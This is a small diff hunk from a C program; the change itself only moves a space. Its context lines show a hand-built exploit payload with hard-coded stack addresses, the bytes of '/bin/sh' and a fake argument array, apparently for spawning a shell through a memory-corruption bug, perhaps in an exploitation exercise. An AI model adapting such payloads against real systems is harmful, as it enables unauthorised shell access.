@@ -45,7 +45,7 @@ int main(void)
                       "\xec\x28\xbf\xbf" // addy of y
                       "\xf0\x28\xbf\xbf" // addy of y + 4
                       "\x2F\x62\x69\x6E\x2f\x73\x68\x00" // /bin/sh string
-                      "\xe4\x28\xbf\xbf\xAA\xAA\xAA\xAA"); // y array (addy of bin/sh followed by 0 word represented here by filler)"
+                      "\xe4\x28\xbf\xbf\xAA\xAA\xAA\xAA" ); // y array (addy of bin/sh followed by 0 word represented here by filler)"
   
   return 0;
 }
